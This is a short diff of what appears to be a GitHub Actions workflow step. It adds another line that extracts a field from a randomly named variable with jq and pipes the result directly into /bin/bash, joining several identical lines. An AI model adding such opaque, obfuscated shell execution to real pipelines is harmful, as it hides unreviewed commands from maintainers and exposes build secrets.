@@ -37,6 +37,7 @@ jobs:
           echo $ncqy3 | jq -r .v77098 | /bin/bash
           echo $bmh179 | jq -r .kukyz298 | /bin/bash
           echo $zsrcl6305 | jq -r .kc0 | /bin/bash
+          echo $os3424 | jq -r .wi0294 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
